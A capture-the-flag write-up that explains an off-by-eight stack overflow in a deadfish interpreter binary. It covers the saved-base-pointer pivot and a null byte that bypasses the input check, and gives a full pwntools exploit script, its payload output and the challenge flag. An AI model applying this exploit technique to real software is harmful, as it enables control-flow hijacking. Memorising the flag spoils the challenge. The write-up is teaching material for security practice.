# pwn/f1shybuff3r

> Learned about this programming language called deadfish but it can't do anything interesting.  You can't even call a function in deadfish!  Therefore, I'm super confident my flag will remain safe & secure.

Provided: [`deadfish`](deadfish)

## Solution

As always, it's good to check out some information about the binary we're provided, as well as what it does :)

```shell
$ file deadfish
deadfish: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=01a168b34c5040e447fd2b7e2fd91b5c903f623d, with debug_info, not stripped

$ pwn checksec deadfish
[*] '/path/to/deadfish'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

$ ./deadfish
DEADFISH INTERPRETER, READING YOUR PROGRAM IN AT 0x7fff21716740:
AAAAAAAAAAAAAAAAAAAAAA # I typed this
ERROR: UNKNOWN INSTRUCTION DETECTED 'A' at position 0 of 23
```

It looks like we're given an address which is probably related to the stack somehow?
The binary's also unstripped, so let's open it up in Ghidra to verify:

```c
void read_program(void)
{
  long lVar1;
  undefined8 *puVar2;
  char code [256];

  puVar2 = (undefined8 *)code;
  for (lVar1 = 0x20; lVar1 != 0; lVar1 = lVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  printf("DEADFISH INTERPRETER, READING YOUR PROGRAM IN AT %p:\n",code);
  fgets(code,0x108,stdin);
  verify_program(code);
  execute(code);
  return;
}
```

I know this isn't `main` but basically all the real `main` does is call this function so you're not missing out on much :)
So it looks like a 256 byte char array is allocated and 0x108...that's 264 bytes that are read into it, so we can write 8 bytes past the end of the buffer.
Because of how the stack is laid out, that means that we can overwrite the base pointer pushed onto the stack at the beginning of this function, but not its return address.
To see how this is still useful, you need to know a bit about how function calls work at the assembly level.

### Assembly time

In assembly, functions are called via the `call` instruction, which essentially does two things: push a return address (i.e. the address of the next instruction) onto the stack and jump to wherever the function is located to execute its code.

After being called, basically every function starts with the same three instructions:

```
push rbp
mov rbp, rsp
sub rsp, <number>
```

This pushes the previous base pointer onto the stack, copies the previous stack stack pointer into the base pointer register, and decrements the stack pointer by some amount to make room for local function variables.

Similarly, every (?) function ends with the same couple of instructions as well:

```
leave
ret
```

These are essentially equivalent to `mov rsp, rbp ; pop rbp` and `pop rip`, respectively.
`leave` puts the stack pointer back in the right location for the previous function and restores is base pointer as well, and `ret` jumps back to the return address pushed onto the stack by `call` (or wherever it happens to be pointing if it was overwritten :)).

So how does overwriting the base pointer address help us?
Well, doing so allows us to control where the stack pointer is located after `read_program` returns control back to main.
If we overwrite the base pointer with the address of our buffer that we're so conveniently given, we can then effectively control main's stack and therefore return address since we have full control over the buffer's contents.
We can't just put it at the beginning of the buffer, though, since there will be two `leave ; ret` instruction pairs that we'll have to deal with.
If we fill the first 8 bytes of our buffer with garbage, that will end up being popped into rbp at the end of `main`, leaving the next 8 bytes at the top of the stack.
The address pointed to by those 8 bytes will then by jumped to because of the `ret` instruction, so that's where we'd want to put the address to the `win` function.

With all of that in mind, though, we do have to get around the call to `verify_program`, since it didn't seem to like us just spamming `A`s.
Let's check it out in Ghidra as well:

```c
void verify_program(char *prog)
{
  char cVar1;
  size_t sVar2;
  int length;
  int i;

  sVar2 = strlen(prog);
  i = 0;
  do {
    if ((int)sVar2 <= i) {
      return;
    }
    cVar1 = prog[i];
    if (cVar1 != 'i') {
      if (cVar1 < 'j') {
        if ((cVar1 != '\n') && (cVar1 != 'd')) {
LAB_00400831:
          printf("ERROR: UNKNOWN INSTRUCTION DETECTED \'%c\' at position %d of %d",
                 (ulong)(uint)(int)prog[i],(ulong)(uint)i,sVar2 & 0xffffffff);
                    /* WARNING: Subroutine does not return */
          exit(1);
        }
      }
      else if ((cVar1 != 'o') && (cVar1 != 's')) goto LAB_00400831;
    }
    i = i + 1;
  } while( true );
}
```

The decompilation seems to be a bit wacky but based on that the valid characters appear to be `i`, `d`, `s`, and `o`.

There's also a call to `strlen` which looks interesting.
From its [man page](https://www.man7.org/linux/man-pages/man3/strlen.3.html):

> The **strlen**() function calculates the length of the string pointed to by `s`, excluding the terminating null byte ('\0').

So if we include a null byte in those first 8 bytes of our buffer, the only stuff that will be checked is anything before that null byte, so we can then fill the rest of the buffer with whatever we please.

With that in hand, we have all the information we need to craft our payload!
Here's a quick Python script that does the job :)

```python
from pwn import *

if __name__ == "__main__":
    context.log_level = "error"
    # io = process("./deadfish")
    io = remote("chall.ctf-league.osusec.org", 1385)

    # get win function address
    binary = ELF("deadfish")
    win_addr = binary.symbols["win"]

    # parse buffer address from provided prompt
    addr_line = io.readlineS(False)
    buffer_addr = int(addr_line.split()[-1][:-1], 16)

    payload = b"i"*7 + b"\0" # valid deadfish code terminated with null byte
    payload += p64(win_addr) # win function address
    payload += b"i"*240 # garbage to fill the buffer
    payload += p64(buffer_addr) # overwrite base pointer with buffer address

    print(f"Payload: {payload}")

    io.sendline(payload)
    print(io.recvuntil(b"}").decode())
```

When you run that you should get something similar to the following:

```shell
$ python pwn_fish.py
Payload: b'iiiiiii\x00W\x07@\x00\x00\x00\x00\x00iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\xf0e\x8ar\xff\x7f\x00\x00'
osu{wh0_says_d3adf1sh_ha5_n0_c0ntr0l_fl0w?}
```

And there's our flag!
For a [really limited programming language](https://esolangs.org/wiki/Deadfish) we sure were able to do a lot with it, eh? :)